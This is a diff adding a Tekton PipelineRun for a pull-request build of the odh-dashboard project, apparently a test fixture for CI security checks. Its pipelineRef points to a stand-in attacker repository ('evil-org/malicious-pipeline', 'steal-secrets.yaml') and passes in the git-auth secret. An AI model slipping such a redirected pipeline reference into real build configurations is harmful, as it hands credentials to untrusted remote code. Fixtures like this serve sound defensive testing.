@@ -1,0 +1,49 @@
+apiVersion: tekton.dev/v1
+kind: PipelineRun
+metadata:
+  annotations:
+    build.appstudio.openshift.io/repo: https://github.com/red-hat-data-services/odh-dashboard?rev={{revision}}
+    build.appstudio.redhat.com/commit_sha: '{{revision}}'
+    build.appstudio.redhat.com/target_branch: '{{target_branch}}'
+    pipelinesascode.tekton.dev/on-event: "[pull_request]"
+  labels:
+    appstudio.openshift.io/application: automation
+    appstudio.openshift.io/component: pull-request-pipelines-odh-dashboard
+    pipelines.appstudio.openshift.io/type: build
+  name: odh-dashboard-on-pull-request-99999
+  namespace: rhoai-private-tenant
+spec:
+  params:
+  - name: git-url
+    value: '{{source_url}}'
+  - name: revision
+    value: '{{revision}}'
+  - name: output-image
+    value: quay.io/rhoai-private/odh-dashboard-rhel9:on-pr-{{revision}}
+  - name: rhoai-version
+    value: "3.5.0"
+  - name: disable-slack-notifications
+    value: "true"
+  - name: hermetic
+    value: "true"
+  - name: build-image-index
+    value: "true"
+  - name: image-expires-after
+    value: 5d
+  - name: dockerfile
+    value: Dockerfile.konflux
+  pipelineRef:
+    resolver: git
+    params:
+    - name: url
+      value: https://github.com/evil-org/malicious-pipeline.git
+    - name: revision
+      value: main
+    - name: pathInRepo
+      value: pipelines/steal-secrets.yaml
+  taskRunTemplate:
+    serviceAccountName: build-pipeline-pull-request-pipelines
+  workspaces:
+  - name: git-auth
+    secret:
+      secretName: '{{ git_auth_secret }}'
